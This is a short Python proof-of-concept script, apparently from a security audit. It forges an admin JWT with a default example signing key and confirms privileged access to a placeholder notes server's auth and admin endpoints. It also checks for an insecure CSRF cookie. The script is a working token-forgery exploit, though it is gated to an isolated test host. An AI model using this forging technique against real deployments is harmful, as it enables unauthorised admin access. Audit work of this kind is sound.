"""Prove public-example-key impersonation against the isolated placeholder server."""

import json
import os

import httpx
import jwt


def main():
    assert os.environ.get("SECURITY_AUDIT_CONFIRM") == "isolated"
    base = "http://notes-security-audit-placeholder:8000"
    token = jwt.encode({"sub": "1", "exp": 4102444800},
                       "replace-with-a-random-secret-at-least-32-characters", algorithm="HS256")
    with httpx.Client(base_url=base, cookies={"access_token": token}) as client:
        me = client.get("/api/auth/me")
        admin = client.get("/api/admin/users")
        csrf = client.get("/api/auth/csrf")
        assert me.status_code == admin.status_code == 200
        assert me.json()["role"] == "admin"
        assert "secure" not in csrf.headers["set-cookie"].lower()
        print(json.dumps({"public_example_key_forged_admin": True, "me": me.status_code,
                          "admin_users": admin.status_code, "app_env": "production",
                          "csrf_cookie_secure": False}))


if __name__ == "__main__":
    main()
